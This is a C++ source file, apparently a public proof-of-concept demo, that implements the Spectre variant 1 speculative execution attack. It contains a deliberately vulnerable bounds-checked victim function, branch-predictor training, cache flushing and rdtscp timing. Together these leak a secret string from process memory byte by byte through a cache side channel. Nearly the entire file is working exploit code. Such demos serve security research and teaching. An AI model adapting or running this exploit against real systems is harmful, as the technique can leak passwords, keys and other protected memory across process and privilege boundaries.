//
// main.cpp
// spectreScope
//
// Created by Maxim Morozov on 04/01/2018.
// Copyright © 2018 Maxim Morozov. All rights reserved.
//
// The demo of the speculative execution attack Spectre (CVE-2017-5753, CVE-2017-5715).
//

#include <iostream>
#include <iomanip>
#include <cstdint>

#ifdef _MSC_VER
    #include <intrin.h> // rdtscp and clflush
    #include <windows.h>
    #pragma optimize("gt", on)
#else
    #include <x86intrin.h> // rdtscp and clflush
#endif

const size_t CACHE_LINE_SIZE = 64;
const size_t MAGIC_SIZE = 512; // It has to be big enought in order to ensure cache hits.
const size_t VALUES_IN_BYTE = 256;
const uint64_t CACHE_HIT_THRESHOLD = 80; // We suppose that a cache hit happens if time <= this threshold.

const size_t STEP_WIDTH = 2;
const size_t VALUE_WIDTH = 2;
const size_t SCORE_WIDTH = 2;

//====================================================================
// Victim Code

unsigned int array1_size = 16;
uint8_t unused1[CACHE_LINE_SIZE] = {0};
uint8_t array1[160] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
uint8_t unused2[CACHE_LINE_SIZE] = {0};
uint8_t array2[VALUES_IN_BYTE * MAGIC_SIZE] = {0};

const char* const SECRET = "Your CPU is crap. Thank you very much Intel!";

uint8_t dummy = 0; // It is required in order to prevent removing victimFunction() by the optimizatior of the compiler.

void victimFunction(const size_t x) {
    if (x < array1_size) {
        dummy &= array2[array1[x] * MAGIC_SIZE];
    }
}

//====================================================================
// Attack Code

// The function returns a best guess in value[0] and runner-up in value[1].
void readMemoryByte(const size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[VALUES_IN_BYTE] = {0};
    int i = 0;
    int j = 0;
    int k = 0;
    int mix_i = 0;
    int junk = 0;
    size_t training_x = 0;
    size_t x = 0;;
    uint64_t time1 = 0;
    uint64_t time2 = 0;
    uint64_t timeLatency = 0;
    volatile const uint8_t* address = 0;

    for (i = 0; i < VALUES_IN_BYTE; ++i) {
        results[i] = 0;
    }

    for (int tries = 999; tries > 0; --tries) {
        // Flush array2 from cache.
        for (i = 0; i < VALUES_IN_BYTE; i++) {
            _mm_clflush(&array2[i * MAGIC_SIZE]);
        }

        // 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x).
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);

            // Delay (can also mfence).
            for (volatile int z = 0; z < 100; ++z) {}

            // Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0.
            // Avoid jumps in case those tip off the branch predictor.
            x = ((j % 6) - 1) & ~0xFFFF; // Set x=FFF.FF0000 if j%6==0 else x=0.
            x = (x | (x >> 16));         // Set x=-1         if j&6=0  else x=0.
            x = training_x ^ (x & (malicious_x ^ training_x));

            // Call the victim.
            victimFunction(x);
        }

        //
        // The core of the attack.
        //
        // Time reads. Order is lightly mixed up to prevent stride prediction.
        for (i = 0; i < VALUES_IN_BYTE; ++i) {
            mix_i = ((i * 167) + 13) & (VALUES_IN_BYTE - 1);
            address = &array2[mix_i * MAGIC_SIZE];

            time1 = __rdtscp(reinterpret_cast<unsigned int*>(&junk)); // READ TIMER BEFORE
            junk = *address;                                          // MEMORY ACCESS
            time2 = __rdtscp(reinterpret_cast<unsigned int*>(&junk)); // READ TIMER AFTER
            timeLatency = time2 - time1;                              // COMPUTE LATENCY

            if (timeLatency <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]) {
                // CACHE HIT HAPPENS
                // Increment the score of this value.
                ++results[mix_i];
            }
        }

        // Locate highest & second-highest results tallies in j and k.
        j = k = -1;
        for (i = 0; i < VALUES_IN_BYTE; ++i) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }

        if (results[j] >= (2 * results[k] + 5) || (2 == results[j] && 0 == results[k])) {
            break; // Clear success if best is > 2*runner-up + 5 or 2/0.
        }
    }

    // It is required in order to prevent removing code above by the optimizatior of the compiler.
    results[0] ^= junk;

    value[0] = static_cast<uint8_t>(j);
    score[0] = results[j];
    value[1] = static_cast<uint8_t>(k);
    score[1] = results[k];
}

char toAsciiChar(const uint8_t value) {
    return (value > 31 && value < 127) ? static_cast<char>(value) : '?';
}

void spectreAttack(const char* const targetAddress, const size_t targetLength) {
    std::cout << "Spectre Attack" << std::endl;
    std::cout << "Reading " << targetLength << " bytes" << std::endl;

    for (size_t i = 0; i < sizeof(array2); ++i) {
        array2[i] = 1; // Write to array2 so in RAM not copy-on-write zero pages.
    }

    size_t malicious_x = static_cast<size_t>(targetAddress - reinterpret_cast<char*>(array1));
    uint8_t value[2] = {0};
    int score[2] = {0};

    for (size_t i = 1; i <= targetLength; ++i) {
        std::cout
            << std::dec << std::setw(STEP_WIDTH) << std::setfill(' ') << i
            << " reading at malicious_x=" << reinterpret_cast<void*>(malicious_x);

        readMemoryByte(malicious_x, value, score);
        ++malicious_x;

        const bool success = (score[0] >= (score[1] * 2));

        std::cout
            << ": "
            << (success ? "success" : "unclear")
            << " value=0x" << std::hex << std::setw(VALUE_WIDTH) << std::setfill('0') << static_cast<uint16_t>(value[0])
            << " [ " << toAsciiChar(value[0])
            << " ] score=" << std::dec << std::setw(SCORE_WIDTH) << std::setfill(' ') << score[0];

        if (score[1] > 0) {
            std::cout
                << ", second best value=0x" << std::hex << std::setw(VALUE_WIDTH) << std::setfill('0') << static_cast<uint16_t>(value[1])
                << " [ " << toAsciiChar(value[1])
                << " ] score=" << std::dec << std::setw(SCORE_WIDTH) << std::setfill(' ') << score[1];
        }

        std::cout << std::endl;
    }
}

int main(int argc, const char* argv[]) {
    std::cout << "Speculative Execution Demo" << std::endl;

    spectreAttack(SECRET, strlen(SECRET));

    return 0;
}
